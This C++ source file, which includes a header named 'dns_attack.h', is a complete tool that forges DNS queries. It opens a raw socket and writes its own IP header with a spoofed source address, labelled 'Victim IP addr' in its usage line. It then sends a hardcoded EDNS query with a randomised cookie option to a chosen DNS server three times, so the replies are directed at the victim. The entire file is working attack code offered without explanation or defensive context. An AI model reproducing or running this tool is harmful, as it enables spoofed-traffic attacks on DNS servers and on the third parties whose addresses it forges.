#include "dns_attack.h"

using namespace std;

int main(int argc, char **argv) {
	char payload[payload_size + 1] = "\x74\x12\x01\x20\x00\x01\x00\x00\x00\x00\x00\x01\x01\x61\x02\x74\x67\x02\x70\x65\x00\x00\x10\x00\x01\x00\x00\x29\x10\x00\x00\x00\x80\x00\x00\x0c\x00\x0a\x00\x08\xff\xff\xff\xff\xff\xff\xff\xff";

	if (argc != 4) {
		fprintf(stderr, "Usage: %s <Victim IP addr> <UDP src port> <DNS Server IP addr>\n", argv[0]);
		return 1;
	}

	srand(time(NULL));

	send_pkt(payload, argv);
	send_pkt(payload, argv);
	send_pkt(payload, argv);

	return 0;
}

int send_pkt(char *payload, char **argv) {
	char buffer[90];
	int one = 1;
	const int *val = &one;

	int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	struct ip *ip = (struct ip *) buffer;
	struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct ip));

	if (sd < 0) {
		fprintf(stderr, "Error creating socket\n");
		return -1;
	}

	ip->ip_hl = 5;
	ip->ip_v = 4;
	ip->ip_tos = 0;
	ip->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + payload_size;
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = 64;
	ip->ip_p = 17;
	ip->ip_sum = 0;

	ip->ip_src.s_addr = inet_addr(argv[1]);
	ip->ip_dst.s_addr = inet_addr(argv[3]);

#ifndef __APPLE__
	udp->source = htons(atoi(argv[2]));
	udp->dest = htons(53);
	udp->len = htons(sizeof(struct udphdr) + payload_size);
	udp->check = 0;
#else
	udp->uh_sport = htons(atoi(argv[2]));
	udp->uh_dport = htons(53);
	udp->uh_ulen = htons(sizeof(struct udphdr) + payload_size);
	udp->uh_sum = 0;
#endif // __APPLE__

	char *dns = (char *) (&udp[1]);
	memcpy(&dns[0], payload, payload_size);
	for (int i=40; i<48; i++) dns[i] = rand();

	ip->ip_sum = csum((unsigned short *) buffer, ip->ip_len >> 1);

	struct sockaddr_in to_addr;
	to_addr.sin_family = AF_INET;
	to_addr.sin_port = htons(53);
	to_addr.sin_addr.s_addr = inet_addr(argv[3]);

	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
		fprintf(stderr, "Error at setsockopt()\n");
		return -1;
	}

	int bytes_sent = sendto(sd, buffer, ip->ip_len, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));

	return bytes_sent;
}

unsigned short csum(unsigned short *buf, int nwords) {
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}
